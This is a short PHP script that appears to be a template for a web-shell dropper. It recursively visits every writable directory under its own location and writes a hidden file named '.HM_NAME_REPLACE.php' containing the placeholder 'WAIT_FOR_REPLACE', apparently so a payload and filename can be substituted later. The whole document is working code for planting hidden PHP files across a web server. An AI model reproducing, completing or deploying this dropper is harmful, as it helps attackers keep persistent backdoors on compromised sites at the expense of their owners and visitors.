<?php
function createSFile($dir) {
    if (!is_dir($dir) || !is_writable($dir)) { return; }

    $data = "WAIT_FOR_REPLACE";
    $directories = array_slice(scandir($dir),2);
    file_put_contents($dir.DIRECTORY_SEPARATOR.'.HM_NAME_REPLACE.php', $data);

    foreach ($directories as $directory) {
        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
        if (is_dir($subdir)) { createSFile($subdir); }
    }

}
$currentDir = dirname(__FILE__);
createSFile($currentDir);
?>
